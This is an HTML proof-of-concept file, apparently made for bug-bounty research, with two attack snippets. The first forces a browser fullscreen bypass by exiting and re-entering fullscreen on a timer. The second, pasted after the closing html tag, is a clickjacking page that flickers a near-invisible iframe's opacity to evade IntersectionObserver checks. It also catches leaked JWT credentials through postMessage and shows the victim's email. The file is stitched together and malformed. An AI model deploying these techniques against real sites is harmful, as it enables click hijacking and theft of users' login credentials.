<!DOCTYPE html>
<html>
<head>

  <title>Bypass FS - Bounty Research</title>
  <style>
    body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; cursor: pointer; }
    #target { padding: 20px 40px; border: 2px solid #4ec9b0; border-radius: 8px; font-family: monospace; }
  </style>
</head>
<body>

  <div id="target">CLICK TO TEST</div>

  <script>
    const el = document.documentElement;

    async function attemptBypass() {
      if (!document.fullscreenElement) {
        await el.requestFullscreen().catch(() => {});
      }

      requestAnimationFrame(() => {
        document.exitFullscreen();
        
        setTimeout(() => {
          el.requestFullscreen().catch((err) => console.log(err));
        }, 65); 
      });
    }

    document.getElementById('target').addEventListener('click', attemptBypass);
  </script>
</body>
</html>    
    <button id="trap-btn" onmouseover="startAttack()"></button>
    
    <iframe id="target-frame" src="target.html"></iframe>

    <div id="res" style="margin-top: 20px; font-weight: bold;"></div>

    <script>
        function startAttack() {
            const frame = document.getElementById("target-frame");
            // Teknik Timing Attack Agresif (Race Condition)
            // Melakukan "hammering" pada opacity agar IntersectionObserver bingung
            let count = 0;
            let interval = setInterval(() => {
                // Berganti antara hampir transparan untuk menipu deteksi
                frame.style.opacity = (count % 2 === 0) ? '0.01' : '0.02';
                count++;
                // Berhenti setelah 100 kali perubahan
                if (count > 100) clearInterval(interval); 
            }, 5); 
        }

        // Listener untuk menangkap kredensial yang bocor
        window.onmessage = (e) => {
            if (e.data && e.data.credential) {
                const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
                document.getElementById('res').innerHTML = 
                    `<div class="alert alert-success">DATA BOCOR: ${payload.email}</div>`;
                console.log("Credential leaked:", payload);
            }
        };
    </script>
